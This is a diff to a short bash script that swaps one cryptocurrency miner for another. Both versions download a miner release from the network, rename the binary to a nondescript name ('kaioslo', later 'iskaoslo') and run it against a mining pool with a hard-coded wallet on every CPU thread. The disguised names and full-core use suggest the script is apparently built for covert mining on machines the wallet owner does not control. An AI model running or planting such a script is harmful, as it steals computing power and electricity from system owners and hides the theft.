@@ -1,5 +1,6 @@
 #!/bin/bash
-wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz
-tar xf hellminer_linux64_avx2.tar.gz
-mv hellminer kaioslo
-./kaioslo -c stratum+tcp://na.luckpool.net:3956 -u RUfB3cXeuFP2itqaiAF4ov1cx17RBLxppw.$(echo $RANDOM | md5sum | head -c 10) -p x --cpu $(nproc --all)
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.6/SRBMiner-Multi-3-4-6-Linux.tar.gz
+tar xf SRBMiner-Multi-3-4-6-Linux.tar.gz
+cd SRBMiner-Multi-3-4-6
+mv SRBMiner-MULTI iskaoslo
+./iskaoslo --algorithm xelishashv3 --pool de.xelis.gfwroute.com:1225 --wallet xel:z677gw7u6eayct3w34ezg3zzm42sq90txrh5z9hh3ur5puctu4tqzqqyqqvsczqwuch38.$(echo $RANDOM | md5sum | head -c 10) --disable-gpu --cpu-threads $(nproc --all)
